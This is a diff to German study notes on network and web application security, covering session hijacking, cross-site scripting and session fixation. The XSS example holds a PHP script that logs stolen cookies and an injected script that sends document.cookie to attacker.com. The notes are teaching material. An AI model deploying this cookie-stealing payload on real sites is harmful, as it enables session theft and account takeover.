@@ -41,6 +41,7 @@ Zusätzlich lässt sich der Benutzer auch noch als Layer 8 im [[OSI und TCP-IP R
 	- korrekte Konfiguration sicherstellen
 
 # Internetschicht
+Siehe [[IPv4]] und [[IPv6]]
 
 # Transportschicht
 ## [[TCP]]-Verbindungsaufbau missbrauchen
@@ -58,3 +59,53 @@ Zusätzlich lässt sich der Benutzer auch noch als Layer 8 im [[OSI und TCP-IP R
 - Speichern der für den Verbindungsaufbau benötigten Daten in Sequenznummer
 
 # Anwendungsschicht
+
+# Web Application Security
+besteht aus:
+- Präsentation der Daten im Webbrowser
+- Applikationslogik vom Applikationsserver
+- Datenbank im Hintergrund als Persistenz-Schicht
+
+## Session Hijacking
+**Definition:** Der Angriff Session Hijacking zielt darauf ab, dass ein Angreifer eine gültige Benutzersitzung (Session) übernimmt, um sich als dieser User auszugeben.
+
+Session-IDs können zum Beispiel an folgenden Stellen auftauchen:
+- Als URL-Parameter:
+`https://www.domain.com/index.php?id=4711`
+- Im Pfad:
+`https://www.domain.com/4711/index.php`
+- Als Hidden Field im HTML-Code:
+`<input type="hidden" name="PHPSESSID" value="4711">`
+- Als Cookie:
+```
+GET /index.php HTTP/1.1
+Host: www.domain.com
+Cookie: session=4711
+```
+- Local Storage bzw. Session Storage
+
+## Cross-Site Scripting
+**Definition:** Beim Cross-Site Scripting (abgekürzt: XSS) injiziert ein Angreifer schädlichen JavaScript-Code in eine Webseite, der später im Browser anderer Nutzer ausgeführt wird.
+
+### Beispiel
+PHP-Skript auf dem Server:
+``` php
+<?php
+	$cookie=($_GET['cookie']);
+	$myFile = "CollectedSessions.txt";
+	$fh = fopen($myFile, 'a') or die("can't open file");
+	$stringData = $cookie."\n";
+	fwrite($fh, $stringData);
+	fclose($fh);
+?>
+```
+JavaScript Code Injection:
+``` html
+<script>
+	document.location='https://www.attacker.com/cookie_recv.php?cookie='
+	+ document.cookie;
+</script>
+```
+
+## Session Fixation
+**Definition:** Bei einer sog. Session Fixation setzt ein Angreifer die Session-ID eines Opfers im Voraus fest und bringt das Opfer dazu, diese Session zu verwenden.
